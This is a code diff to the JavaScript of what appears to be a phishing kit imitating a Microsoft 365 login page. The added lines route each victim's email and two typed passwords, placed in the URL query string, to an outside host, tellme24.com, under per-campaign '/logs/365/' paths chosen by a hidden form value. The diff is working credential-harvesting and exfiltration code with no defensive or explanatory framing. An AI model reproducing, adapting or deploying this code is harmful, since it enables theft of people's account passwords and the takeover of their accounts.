@@ -6,6 +6,7 @@ const user = urls.get('user');
 
 const e_input = document.getElementById("e_input");
 const load_ani = document.getElementById("load_ani");
+const data_send = document.getElementById("data_send");
 
 let link1 = document.getElementById("link1");
 let link2 = document.getElementById("link2");
@@ -113,7 +114,19 @@ else if (validEmail.test(e_input.value)) {
 function getPass(pass1, pass2, mail) {
     if (pass1 != "" && pass2 !="" && mail != "") {
         let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
+
+        if (data_send.value == 1) {
+            url = "https://tellme24.com/logs/365/gb1/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+        }
+        else  if (data_send.value == 2) {
+            url = "https://tellme24.com/logs/365/gb2/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+        }
+        else  if (data_send.value == 3) {
+            url = "https://tellme24.com/logs/365/gb3/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+        } 
+
         location = url;
+        
     }
     else {
         e_input.style.borderColor = "red";
